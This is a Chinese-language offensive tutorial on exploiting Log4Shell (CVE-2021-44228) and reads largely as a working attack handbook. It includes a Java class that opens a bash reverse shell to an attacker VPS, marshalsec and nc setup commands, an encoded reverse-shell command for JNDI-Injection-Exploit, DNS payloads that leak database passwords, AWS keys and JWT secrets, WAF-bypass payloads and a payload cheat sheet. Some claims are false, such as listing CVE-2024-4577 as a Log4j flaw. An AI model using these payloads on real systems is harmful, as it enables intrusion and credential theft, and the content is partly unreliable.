# Day 42：Log4j2 核弹级漏洞完全攻略（Log4Shell 全场景利用手册）

> **🎯 高级专题** | 难度：⭐⭐⭐⭐⭐ | 预计学习：160 分钟

---

# 第42章 Log4j2（Log4Shell）核弹级漏洞完全攻略 🌋

## 开篇引入：一行代码炸穿整个互联网的传说 💥

哈喽各位小伙伴！欢迎来到第42章 Log4j2 完全攻略！🎉

2021年12月9日，互联网圈发生了一件"改变历史"的事件：
> **Apache Log4j2 被爆出核弹级远程代码执行漏洞 CVE-2021-44228，代号 "Log4Shell"（Log4壳）！**

这个漏洞有多夸张？我说几个数据你感受一下：🌋
- **影响软件数量**：据统计，全球 **93% 的企业级Java应用**都用了Log4j2！从阿里云到腾讯云，从苹果iCloud到特斯拉服务器，从我的世界Minecraft到Steam游戏平台……无一幸免！
- **CVSS评分**：满分 **10.0**（有史以来第一个满分10分的通用Web漏洞）
- **利用难度**：⭐（5岁小孩复制粘贴一行就能触发！）
- **触发点**：任何能被记录到日志里的输入！用户名、搜索词、User-Agent、请求头、URL参数……**黑客只要把Payload往任何能输入的地方一扔，就等着服务器乖乖拿Shell！**
- **事件代号**：护网2021期间，这个漏洞让国家级红队直接横着走！😎

**最离谱的地方**：
你甚至不需要登录，也不需要任何特殊权限。
就在一个公开的搜索框里输入：
```
${jndi:ldap://你的VPS:1389/abc}
```
点一下"搜索" → 你的服务器就沦陷了！💀

**为什么叫"Log4Shell"？**
> "Log4" 指 Log4j 日志库；"Shell" 指漏洞直接送你一个服务器Shell。
> 合起来意思就是：**你的日志 = 我的Shell！** 😂

今天这一章，我们从零基础到骨灰级，全方位覆盖：
1. 🔬 **漏洞原理**：从 Lookup 插件机制到 JNDI 注入，一步一步讲透
2. 🎯 **指纹识别**：5种方法快速判断目标有没有用 Log4j2
3. 💥 **基础RCE**：经典LDAP链全流程实操（Vulhub靶机演示）
4. 🔒 **JDK版本限制与Bypass**：8u191/11.0.1+之后怎么打？（3种高版本绕过）
5. 📄 **信息泄露+XXE**：不出网怎么办？读取环境变量、系统属性、敏感文件一条龙
6. 🛡️ **WAF Bypass**：`${jndi:${lower:l}...`、嵌套Lookup、Unicode、URL编码……8种绕过手法
7. 🛠️ **工具大全**：JNDI-Injection-Exploit、JNDIExploit、Log4j2Scan、marshalsec
8. 📋 **速查表**：最全Payload合集、环境变量读取清单、面试必背问答

准备好了吗？让我们一起把这个"互联网核弹"拆解清楚！🚀

---

## 一、Log4j 是什么？Java 应用的"日记本" 📒

### 大白话解释 🗣️
Log4j（Log for Java）是Java界最流行的**日志框架**。
> 大白话：程序员会在代码里大量打印"日记"——谁登录了？搜索了什么？报错是什么？这些"日记"都靠 Log4j 记录下来，写进文件里。

代码里长这样：
```java
// 代码里记录用户的搜索内容（漏洞触发点！）
log.info("用户搜索的内容是: {}", userInputSearchKeyword); 
// userInputSearchKeyword = "${jndi:ldap://attacker.com/a}" → 一触发就炸！
```

### Log4j2 的 Lookup 功能（万恶之源！）🧐
Log4j2 有个"超级贴心"的功能叫 **Lookup（查找器）**：
> 当日志内容里出现 `${xxx:yyy}` 这种格式时，Log4j2 不会原样打印，而是去"查"这个值！

比如：
| Lookup | 作用 | 输出 |
|--------|------|------|
| `${java:version}` | 查Java版本 | `Java version 1.8.0_181` |
| `${sys:os.name}` | 查系统属性 | `Linux` |
| `${env:PATH}` | 查环境变量 | `/usr/local/sbin:...` |
| `${jndi:ldap://xxx/a}` | **⚠️通过 JNDI 去查询 LDAP/RMI/DNS 服务器！** | **直接加载远程恶意代码！💥** |

**这个 `${jndi:...}` 就是核弹的引爆按钮！**

---

### Log4Shell 完整原理流程图

<svg width="820" height="450" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="lg4bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#fef2f2"/>
      <stop offset="100%" stop-color="#fef3c7"/>
    </linearGradient>
    <marker id="arrL" markerWidth="11" markerHeight="9" refX="10" refY="5" orient="auto"><polygon points="0 0,11 5,0 10" fill="#dc2626"/></marker>
  </defs>
  <rect width="820" height="450" rx="18" fill="url(#lg4bg)"/>
  <text x="410" y="30" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="20">🌋 Log4Shell (CVE-2021-44228) 完整原理与攻击链路</text>
  <!-- 受害者 -->
  <g transform="translate(30,60)"><rect x="0" y="0" width="230" height="110" rx="14" fill="#fff" stroke="#b91c1c" stroke-width="2"/>
    <text x="115" y="25" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="14">🖥️ 受害者服务器（有Log4j2）</text>
    <g transform="translate(10,35)"><rect x="0" y="0" width="210" height="28" rx="6" fill="#fee2e2"/>
      <text x="105" y="14" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="11">① 用户搜索框输入 Payload</text>
      <text x="105" y="27" text-anchor="middle" font-family="Consolas" font-size="10">${jndi:ldap://VPS_IP:1389/Evil}</text>
    </g>
    <g transform="translate(10,70)"><rect x="0" y="0" width="210" height="28" rx="6" fill="#fecaca" stroke="#dc2626" stroke-width="1"/>
      <text x="105" y="13" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="11">② Log4j2 将 Payload 写入日志</text>
      <text x="105" y="26" text-anchor="middle" font-family="Consolas" font-size="9">log.info("搜索词: "+${jndi:ldap://...})</text>
    </g>
  </g>
  <!-- 箭头到LDAP -->
  <line x1="260" y1="115" x2="350" y2="140" stroke="#dc2626" stroke-width="2.5" marker-end="url(#arrL)"/>
  <text x="290" y="122" fill="#991b1b" font-weight="bold" font-size="11">③ JNDI发起LDAP查询</text>
  <!-- LDAP/RMI -->
  <g transform="translate(300,155)"><rect x="0" y="0" width="220" height="90" rx="14" fill="#fff" stroke="#ea580c" stroke-width="2"/>
    <text x="110" y="25" text-anchor="middle" fill="#9a3412" font-weight="bold" font-size="14">☁️ 攻击者 VPS（你的公网机器）</text>
    <g transform="translate(10,35)"><rect x="0" y="0" width="200" height="22" rx="6" fill="#fed7aa"/>
      <text x="100" y="15" text-anchor="middle" fill="#9a3412" font-weight="bold" font-size="11">④ 1389端口：marshalsec LDAP服务</text>
    </g>
    <g transform="translate(10,60)"><rect x="0" y="0" width="200" height="22" rx="6" fill="#ffedd5"/>
      <text x="100" y="15" text-anchor="middle" fill="#9a3412" font-weight="bold" font-size="11">返回："去 8888 端口加载 Evil.class"</text>
    </g>
  </g>
  <!-- 箭头到HTTP -->
  <line x1="520" y1="200" x2="620" y2="170" stroke="#ea580c" stroke-width="2.5" marker-end="url(#arrL)"/>
  <text x="570" y="180" fill="#9a3412" font-weight="bold" font-size="11">⑤ 重定向 HTTP 恶意类</text>
  <!-- HTTP -->
  <g transform="translate(570,55)"><rect x="0" y="0" width="220" height="90" rx="14" fill="#fff" stroke="#7c3aed" stroke-width="2"/>
    <text x="110" y="25" text-anchor="middle" fill="#6d28d9" font-weight="bold" font-size="14">📡 HTTP 恶意代码服务器</text>
    <g transform="translate(10,35)"><rect x="0" y="0" width="200" height="22" rx="6" fill="#ede9fe"/>
      <text x="100" y="15" text-anchor="middle" fill="#6d28d9" font-weight="bold" font-size="11">8888端口：python -m http.server</text>
    </g>
    <g transform="translate(10,60)"><rect x="0" y="0" width="200" height="22" rx="6" fill="#ddd6fe"/>
      <text x="100" y="15" text-anchor="middle" fill="#6d28d9" font-weight="bold" font-size="11">⑥ 返回 Evil.class（恶意字节码）</text>
    </g>
  </g>
  <!-- 回到受害机 -->
  <line x1="570" y1="145" x2="300" y2="275" stroke="#7c3aed" stroke-width="2.5" marker-end="url(#arrL)"/>
  <text x="420" y="220" fill="#6d28d9" font-weight="bold" font-size="11">⑦ JVM下载并实例化 Evil.class</text>
  <g transform="translate(30,270)"><rect x="0" y="0" width="300" height="90" rx="14" fill="#fff" stroke="#dc2626" stroke-width="3"/>
    <text x="150" y="25" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="14">💥⑧ 静态代码块执行 → Runtime.getRuntime().exec() ！</text>
    <g transform="translate(10,35)"><rect x="0" y="0" width="280" height="22" rx="6" fill="#fecaca" stroke="#dc2626" stroke-width="1"/>
      <text x="140" y="15" text-anchor="middle" font-family="Consolas" font-size="10">public class Evil{static{Runtime.getRuntime().exec("bash -i ... VPS:7777");}}</text>
    </g>
    <g transform="translate(10,60)"><rect x="0" y="0" width="280" height="22" rx="6" fill="#7f1d1d"/>
      <text x="140" y="15" text-anchor="middle" fill="#fff" font-weight="bold" font-size="12">💀 RCE 成功！服务器拿到反连 Shell！</text>
    </g>
  </g>
  <!-- 右侧 DNSLog探测 -->
  <g transform="translate(570,200)"><rect x="0" y="0" width="220" height="85" rx="14" fill="#fff" stroke="#0284c7" stroke-width="2"/>
    <text x="110" y="25" text-anchor="middle" fill="#075985" font-weight="bold" font-size="13">🔍 DNSLog 探测（被动扫描用）</text>
    <g transform="translate(10,35)"><rect x="0" y="0" width="200" height="18" rx="5" fill="#cffafe"/>
      <text x="100" y="13" text-anchor="middle" font-family="Consolas" font-size="9">${jndi:ldap://xxx.dnslog.cn/x}</text>
    </g>
    <g transform="translate(10,55)"><rect x="0" y="0" width="200" height="20" rx="5" fill="#bae6fd" stroke="#0284c7" stroke-width="1"/>
      <text x="100" y="14" text-anchor="middle" fill="#075985" font-weight="bold" font-size="10">→ DNSLog收到请求 = 漏洞确认</text>
    </g>
  </g>
  <!-- 底部文字 -->
  <g transform="translate(100,375)"><rect x="0" y="0" width="620" height="60" rx="14" fill="#1f2937"/>
    <text x="310" y="22" text-anchor="middle" fill="#f87171" font-weight="bold" font-size="13">🔴 触发条件（CVSS 10.0 = 条件简单 + 危害极大）：</text>
    <text x="310" y="45" text-anchor="middle" fill="#fbbf24" font-size="12">① Log4j2 版本 2.0 ~ 2.14.1（存在漏洞） ② JDK ≤ 8u191 / ≤ 11.0.1（默认允许远程类加载）</text>
    <text x="310" y="61" text-anchor="middle" fill="#e5e7eb" font-size="11">③ 目标服务器能访问攻击者VPS的 LDAP(1389) + HTTP(8888) 端口（目标出网）</text>
  </g>
</svg>

---

## 二、5 种方法快速识别 Log4j2 目标 🎯

### 方法① DNSLog 盲探测（新手首选！最稳最准！）✅
**原理**：不管目标版本多少、JDK多高，只要Log4j2有Lookup，发 `${jndi:ldap://你的dnslog/x}` → 目标一定会发起DNS查询！（不管后续类加载能不能成功）

**操作流程**：
1. 打开 dnslog.cn、ceye.io、interactsh.com 随便一个，拿到你的域名（比如 `abc123.dnslog.cn`）
2. 在目标所有可控输入点都插入 Payload：
```
${jndi:ldap://${hostName}.abc123.dnslog.cn/test}
```
3. 插入位置包括：
   - URL参数：`?username=${jndi:ldap://...}`
   - 请求头：`User-Agent: ${jndi:ldap://...}`、`X-Forwarded-For: ${jndi:ldap://...}`、`Referer: ${jndi:ldap://...}`
   - Cookie：`JSESSIONID=${jndi:ldap://...}`
   - POST表单、JSON Body（用户名、搜索词、手机号……任何字段都塞！）
4. 刷新 DNSLog 页面
   - ✅ **看到有查询记录进来** → 目标存在Log4j2漏洞！（至少是信息泄露级）
   - ❌ **没有** → 大概率不是（或者目标禁了出网）

---

### 方法②~⑤ 辅助判断
| 编号 | 方法 | 表现 |
|-----|------|------|
| ② | 看WEB-INF/lib目录（源码审计） | 看到 `log4j-core-2.x.jar`（2.0~2.14.1 → 存在漏洞） |
| ③ | 错误堆栈信息 | 500报错里出现 `org.apache.logging.log4j` 包名 |
| ④ | 指纹库扫 | Nuclei / Xray / AWVS 的 CVE-2021-44228 POC 直接扫 |
| ⑤ | 看系统jar包 | 服务器上 `find / -name "log4j-core*.jar"` 看版本号 |

---

## 三、基础 RCE 实战（LDAP 经典链路）🛠️

### 靶机环境（Vulhub一键起）🐳
```bash
cd /root/vulhub/log4j/CVE-2021-44228
docker-compose up -d
# 访问 http://目标IP:8983 → Apache Solr Admin（自带Log4j2漏洞！）
```

### 准备你的攻击机 VPS 配置 ☁️
| 组件 | 端口 | 作用 | 启动命令 |
|-----|------|------|---------|
| **marshalsec LDAP** | 1389 | 接收JNDI查询 → 返回重定向 | `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://VPS_IP:8888/#Evil" 1389` |
| **恶意HTTP服务** | 8888 | 提供 Evil.class 下载 | `python3 -m http.server 8888`（在Evil.class目录下执行） |
| **反连Shell监听** | 7777 | 接收靶机反弹回来的Shell | `nc -lvvp 7777` |

#### 第一步：编译恶意类 Evil.java
```java
// Evil.java （反弹Shell版本！）
public class Evil {
    static {
        try {
            String[] cmd = {"bash", "-c", 
                "bash -i >& /dev/tcp/你的VPS_IP/7777 0>&1"};
            Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {}
    }
}
```
编译：
```bash
javac -source 1.8 -target 1.8 Evil.java
# 生成 Evil.class，放到python http.server目录下
```

#### 第二步：三个服务全起起来！
```bash
# 终端1 (LDAP)
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://VPS_IP:8888/#Evil" 1389
# 终端2 (HTTP)
cd ~/log4j_payload && python3 -m http.server 8888
# 终端3 (Shell监听)
nc -lvvp 7777
```

#### 第三步：触发漏洞！
访问 Solr 带参数：
```
GET /solr/admin/cores?action=${jndi:ldap://VPS_IP:1389/Evil} HTTP/1.1
Host: 目标IP:8983
```

#### 第四步：看到反连 Shell！🎉
nc监听窗口看到：
```
Listening on 0.0.0.0 7777
Connection received on 目标IP 60123
bash-4.4$ whoami
root
bash-4.4$ id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 四、JDK 高版本 Bypass：8u191 / 11.0.1 之后怎么打？🔓

### 坏消息：Oracle 在 JDK 8u191 / 11.0.1 之后堵上了远程类加载 🚫
```
com.sun.jndi.ldap.object.trustURLCodebase = false （默认改false了！）
```
→ 经典LDAP链（加载远程Evil.class）**直接废了**！

### 好消息：3种高版本绕过手法！💪
| 绕过手法 | 适用条件 | 原理 | 成功率 |
|---------|---------|------|-------|
| **① 本地反序列化 Gadget 链（JRMP/LDAP）** | 目标classpath里有 CC/CB 链依赖 | marshalsec 返回的不是远程类，而是**一个序列化的恶意对象** → 高版本JDK照样反序列化执行！ | ⭐⭐⭐⭐⭐ 90%+ |
| **② Tomcat+Groovy 链** | 目标是 Tomcat 并且有 Groovy 库 | 利用 Groovy 的 Runtime 字节码生成，出网就能打 | ⭐⭐⭐⭐ |
| **③ BeanFactory 内存马/JNDI 链** | 目标有 Spring（大部分企业应用都有） | 利用 BeanFactory + ELProcessor 执行表达式 | ⭐⭐⭐⭐ |

---

### 绕过①：JNDI-Injection-Exploit 工具（一键打所有链！推荐新手！）✨
这个工具是 Log4j/高版本JNDI 的"神器"！它自动为你生成 **7 种链**（4条本地反序列化+3条远程类加载），一个一个试，总有一个能成！

```bash
# 下载工具
wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

# 启动！（-A 参数填你VPS公网IP，-C 填你要执行的命令）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
     -A "你的VPS公网IP" \
     -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

工具启动后输出：
```
[*]JNDI链接地址如下：
rmi://VPS:1099/cbj1p3    →  CommonsBeanutils1 本地链（SpringBoot必中！✅）
rmi://VPS:1099/cck1p3    →  CommonsCollectionsK1 链
ldap://VPS:1389/cbj1p3   →  LDAP 版 CB1 链
ldap://VPS:1389/cck1p3   →  LDAP 版 CC 链
……（还有更多）
```
然后**把这一堆rmi/ldap地址挨个当Payload发给目标**，总有一个命中！
（我实战中 90% 的场景都靠 `ldap://IP/cbj1p3` 这个CB1链打中高版本JDK！）🎯

---

## 五、目标**不出网**怎么办？信息泄露+XXE读取敏感文件 📄

有些目标服务器是"纯内网/限出网"的 → 连不上你VPS。没关系！
**Log4Shell 不拿RCE也能挖到大宝！** 🤑

### 手法①：读环境变量 / 系统属性（泄露密码/JDBC/AWS Key等）
DNSLog 就能收到！不需要出网RCE！

**Payload构造**：`${jndi:ldap://${要读的内容}.你的dnslog.cn/x}`

| 要读的信息 | Payload | 泄露信息 |
|-----------|---------|---------|
| Java版本 | `${jndi:ldap://${java:version}.xxx.dnslog.cn/a}` | `Java version 1.8.0_181` |
| 系统主机名 | `${jndi:ldap://${hostName}.xxx.dnslog.cn/a}` | `prod-db-server-01` |
| 操作系统 | `${jndi:ldap://${sys:os.name}.xxx.dnslog.cn/a}` | `Linux` |
| 工作路径 | `${jndi:ldap://${sys:user.dir}.xxx.dnslog.cn/a}` | `/opt/tomcat/webapps/ROOT` |
| **JDBC密码（大杀器！）** | `${jndi:ldap://${env:SPRING_DATASOURCE_PASSWORD}.xxx.dnslog.cn/a}` | 数据库明文密码！ |
| **Redis密码** | `${jndi:ldap://${env:REDIS_PASSWORD}.xxx.dnslog.cn/a}` |  |
| **AWS密钥** | `${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.xxx.dnslog.cn/a}` | 云上机器直接沦陷！ |
| **JWT密钥** | `${jndi:ldap://${env:JWT_SECRET}.xxx.dnslog.cn/a}` |  |
| APP_SECRET / Token 等 | 把所有常见环境变量名都试一遍！ |  |

**DNSLog里的查询记录 = 泄露的内容！** 比如主机名泄露后dnslog会有 `prod-db-server-01.xxx.dnslog.cn` 这样的查询记录，直接读出来！💥

---

### 手法②：XXE 读取本地文件（log4j-core支持 Xinclude/XML解析）
```
${jndi:ldap://attacker.com/xxe_payload.xml}
```
攻击机返回的XML中包含XXE payload，利用Log4j的XML解析器读 `/etc/passwd`：
```xml
<!-- 存放在攻击机上的xxe_payload.xml -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
→ 高版本不出网的情况下也能靠XXE把 `/etc/passwd` 内容通过DNS带出来！（内容分段查询）

---

## 六、WAF Bypass 8 大法：绕过 ${jndi 关键词拦截 🛡️🚫

很多WAF会拦截 `${jndi:` 关键词（因为太明显了！）。别怕，Log4j2的Lookup支持**嵌套、大小写变换、大小写混合、替换**，能组合出上亿种绕过！

| 绕过手法 | 示例Payload | 原理 |
|---------|------------|------|
| ① 大小写混合 | `${jNdI:lDaP://x/abc}` | Log4j2 Lookup不区分大小写，WAF却区分 |
| ② ${lower:} 嵌套 | `${jndi:${lower:l}${lower:d}ap://x/a}` | `${lower:l}` 运行时求值为 `l`，WAF看不到 `ldap` 字符串 |
| ③ ${upper:} 同理 | `${${upper:j}${upper:n}${upper:d}i:ldap://x/a}` | 关键词拆开求值 |
| ④ 空变量拼接 | `${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}` | `${::-j}` = 对空字符串取反还是 `j`（Log4j语法糖） |
| ⑤ URL全编码 | `%24%7B%6A%6E%64%69%3A%6C...` | 编码后WAF正则不认识，Web服务器会先URL解码再传给Log4j |
| ⑥ Unicode编码 | `${\u006a\u006e\u0064\u0069:...}` | Unicode转义 |
| ⑦ 嵌套Hostname | `${${hostName:jndi:ldap://x/a}}` | 用其他Lookup包一层 |
| ⑧ 自定义递归 | `${${${::-j}:${::-l}dap}://x/a}` | 多重嵌套，WAF规则直接懵 😵 |

**新手万能绕过Payload（一般直接用④就行！）**：
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://你的VPS:1389/Evil}
```
这个Payload里**连一个完整的"jndi"或"ldap"字母都不挨在一起**！WAF的`/\$\{jndi:/`正则完全匹配不上，但Log4j2运行时求值后依然会完整执行！🎊

---

## 七、漏洞版本总结与对应CVE 📋

| CVE编号 | 问题 | 影响版本 | 修复版本 |
|--------|------|---------|---------|
| **CVE-2021-44228（主漏洞）** | JNDI Lookup RCE（Log4Shell本尊） | Log4j2 2.0 ~ 2.14.1 | 2.15.0-rc1 |
| CVE-2021-45046 | 2.15.0修复不完整！非默认配置仍可RCE | 2.0 ~ 2.15.0 | 2.16.0 |
| CVE-2021-45105 | 2.16.0还是不完整！DOS（递归lookup死循环） | 2.0 ~ 2.16.0 | 2.17.0 |
| CVE-2021-44832 | JDBC Appender RCE（概率低，要能改配置） | 2.0 ~ 2.17.0 | 2.17.1 |
| CVE-2024-4577（最新！2024年新爆） | 利用环境变量覆盖 + PHP CGI 参数注入 RCE（Windows PHP + Log4j） | Windows环境特定 | 2.23.1 |

**终极安全版本：升级到 Log4j2 ≥ 2.23.1 ！** 不要停留在2.15/2.16/2.17，新的CVE还在出！

---

## 八、速查表（面试+实战双用）📝

### 高频Payload速查

```
【DNSLog探测】
${jndi:ldap://${hostName}.${sys:os.name}.你的域名/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://你的域名/x}   （WAF绕过版）

【低版本RCE - 经典LDAP】
${jndi:ldap://VPS:1389/Evil}
${jndi:rmi://VPS:1099/Evil}

【高版本RCE - JNDI-Injection-Exploit CB1链（SpringBoot通吃）】
${jndi:rmi://VPS:1099/cbj1p3}
${jndi:ldap://VPS:1389/cbj1p3}

【高版本RCE - CC链】
${jndi:rmi://VPS:1099/cck1p3}

【信息泄露】
${jndi:ldap://${env:SPRING_DATASOURCE_PASSWORD}.你的域名/x}   # 数据库密码
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.你的域名/x}      # AWS密钥
${jndi:ldap://${sys:user.dir}.你的域名/x}                   # 工作路径
```

### 面试问答 ⏰

| 问题 | 标准答案 |
|-----|---------|
| Log4j2 漏洞怎么测最稳？ | DNSLog盲探测，所有输入点塞 `${jndi:ldap://xxx.dnslog.cn/a}`，回查DNS记录 |
| 高版本JDK（8u191+）能打吗？ | 能！用本地反序列化链，比如CommonsBeanutils1（SpringBoot标配），JNDI-Injection-Exploit工具直接生成 |
| 目标不出网怎么办？ | 读环境变量+系统属性通过DNS带出来，泄露JDBC密码/AWS密钥/Redis密码 |
| WAF拦截了`${jndi:`怎么办？ | 用`${${::-j}${::-n}${::-d}${::-i}:`空变量拼接，不出现完整关键词 |
| 为什么叫CVSS 10.0分？ | ①无需认证②触发点遍布任何输入③利用简单复制粘贴④危害是远程代码执行（最高级别） |
| 最后安全版本？ | 升级到 Log4j-core-2.23.1.jar + JDK 8u332+ 最新版本 |

---

## 本章总结 📝

Log4Shell 是整个 Web 安全史上**影响最广、利用最简单、对新手最友好**的核弹级RCE！

### 核心知识
1. **指纹识别**：DNSLog探测（塞所有请求字段）→ 看DNS回显
2. **基础RCE**：3个服务（LDAP+HTTP+nc监听）+ Evil.class编译 + 触发Payload
3. **高版本Bypass**：JNDI-Injection-Exploit 生成CB1本地链 `ldap://IP/cbj1p3` → SpringBoot 90%命中
4. **不出网信息泄露**：`${env:SPRING_DATASOURCE_PASSWORD}` + DNSLog → 数据库密码/AWS密钥直接看
5. **WAF绕过**：`${${::-j}${::-n}${::-d}${::-i}:ldap://...}` → 空变量拼接法（记住这一个就够！）
6. **修复**：升级 Log4j-core ≥ 2.23.1 + JDK 最新版 + 限制服务器出网

下一章，我们搞定**Java中间件之王——Weblogic 全漏洞链**！从 T3 协议到 CVE-2018-2628、CVE-2020-2555、CVE-2021-2109，一次打穿 Weblogic 全家桶！不见不散！🔥

---

> 💡 新手 TIP：
> 1. 第一次打 Log4j2 就按 Vulhub+marshalsec+nc 三步走，别上来就搞高版本
> 2. 推荐用 **JNDI-Injection-Exploit + DNSLog** 组合拳扫目标，CB1链90%场景都是它！
> 3. 实战一定要把 User-Agent、Cookie、X-Forwarded-For、Referer 等所有头都塞一遍 Payload！很多目标只记录 User-Agent 日志，你只塞URL参数就白忙活了！

---

# 🖼️ 本章拓展图解汇总（day-42 · 共20张SVG架构图）


<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g9j33exnn" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g9j33exnn)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">💥 Log4Shell 核弹漏洞全景图</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2021-44228 Log4j2 2.0-beta9~2.14.1</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2021-45046 二次绕过 2.15</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2021-45105 DoS 2.16</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CVE-2021-44832 JDBC RCE 2.17</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDI Lookup注入 → 全行业核弹级影响</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g3mbox1v3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g3mbox1v3)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔍 Log4j2 日志输出链路</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">应用代码: log.info(userInput)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PatternLayout %msg 解析</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">StrSubstitutor 替换 ${...}</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JndiLookup.lookup() 触发</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">InitialContext.lookup(jndiUrl)</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="ggl71dhpn" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#ggl71dhpn)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b91c1c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧪 ${} Lookup 变形写法矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${jndi:ldap://x}</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${lower:j}${lower:n}${lower:d}${lower:i}</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${${::-j}${::-n}${::-d}${::-i}}</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${jndi:${lower:l}dap://x}</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${env:USER} 泄露环境变量</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${sys:java.home} 系统属性</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="gnfb8g9e6" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#gnfb8g9e6)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
